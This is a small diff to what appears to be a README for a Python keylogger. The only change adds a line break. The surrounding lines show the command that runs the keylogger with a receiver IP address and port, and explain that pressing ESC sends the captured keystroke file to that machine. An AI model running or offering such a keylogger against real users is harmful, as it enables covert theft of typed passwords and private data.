@@ -110,6 +110,8 @@ In our case, we want to send the `output.txt` file to **192.168.1.97** address v
 python3 src/kylog.py 192.168.1.97 4444
 ```
 
+</br>
+
 ### Stop the keylogger
 
 To stop the keylogger, press the `ESC` key. This will trigger the script to send the captured `output.txt` file to the receiver machine using the IP and port specified earlier.
